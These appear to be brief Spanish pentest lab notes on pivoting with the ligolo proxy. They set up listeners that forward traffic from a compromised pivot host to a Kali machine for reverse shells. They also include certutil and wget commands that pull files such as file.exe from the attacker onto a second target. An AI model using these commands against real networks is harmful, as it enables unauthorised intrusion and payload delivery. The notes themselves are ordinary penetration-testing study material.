Portforwarding

Kali tiene visibilidad con la red externa pero el Target B de la red externa no tiene visibilidad con Kali.

Transferencias de Archivos: abrir puerto 8080 de Target A para redirigir el tráfico al puerto 80 de Kali.

Reverse Shells: abrir puerto 4443 de Target A para redirigir el tráfico al puerto 443 de Kali.

Puertos de portforwarding tienen que ser > 1000.

Kali (consola proxy ligolo)

# --addr 0.0.0.0:8080 -> Todo tráfico que reciba Target A por el puerto 8080 lo manda a Kali
# --to 127.0.0.1:80   -> Redirecciona el tráfico a Kali por el puerto 80
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:4443 --to 127.0.0.1:443
listener_list

Transferir Ficheros

# Kali
python -m http.server 80
# Target B Windows
certutil -urlcache -f http://<ip_target_a>:8080/file.exe file.exe
# Target B Linux

wget http://<ip_target_a>:8080/file.txt
